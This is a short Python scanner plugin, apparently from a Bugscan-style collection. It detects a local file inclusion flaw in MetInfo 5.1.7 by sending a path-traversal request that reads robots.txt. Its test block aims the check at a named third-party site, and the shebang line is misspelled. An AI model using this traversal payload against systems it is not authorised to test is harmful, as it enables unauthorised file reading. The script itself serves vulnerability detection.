#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:MetInfo 5.1.7 LFI 漏洞
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0159386
#Author:烽火戏诸侯

def assign(service, arg):
    if service == 'metinfo':
        return True, arg
    
def audit(arg):
    target =arg+'index.php?index=a&skin=&dataoptimize_html=/../../../robots.txt'
    
    code, head, res, errcode, _ = curl.curl2(target) 
    if code == 200 and ('Disallow:' in res and 'User-agent:' in res):
        security_hole(target)
    
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('metinfo','http://www.xjyrt.com/')[1])